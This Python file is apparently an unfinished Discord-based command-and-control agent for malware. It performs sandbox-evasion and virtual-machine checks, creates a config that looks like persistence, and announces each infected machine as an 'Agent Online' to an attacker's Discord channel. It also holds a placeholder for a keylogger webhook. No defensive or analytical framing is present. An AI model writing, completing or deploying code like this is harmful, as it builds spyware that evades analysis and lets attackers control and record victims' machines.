
import discord
from discord.ext import commands

from datetime import datetime

from libraries import sandboxevasion, maciassdopia


# ========
# Not finished
# ========


GUILD = discord.Object(id = "{GUILD}")
CHANNEL = int("{CHANNEL}")
KEYLOG_WEBHOOK = "{KEYLOG_WEBHOOK}"
CURRENT_AGENT = 0

class BOT(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix = "!", intents = intents, help_command=None)

    async def on_ready(self):
        await self.wait_until_ready()

        self.channel = self.get_channel(CHANNEL)
        now = datetime.now()

        # Creating welcome message for new client
        my_embed = discord.Embed(title = f"{MSG}", description = f"**Time: {now.strftime('%d/%m/%y %H:%M:%S')}**", color = COLOR)


        await self.channel.send(embed=my_embed)

bot = BOT()

if sandboxevasion.test() == True and maciassdopia.isVM() == False:
    config = maciassdopia.createConfig()
    ID = maciassdopia.id()
    if config:
        MSG = f"New Agent Online #{ID}"
        COLOR = 0x00ff00
    else:
        MSG =f"Agent Online #{ID}"
        COLOR = 0x0000FF

    bot.run("{TOKEN}")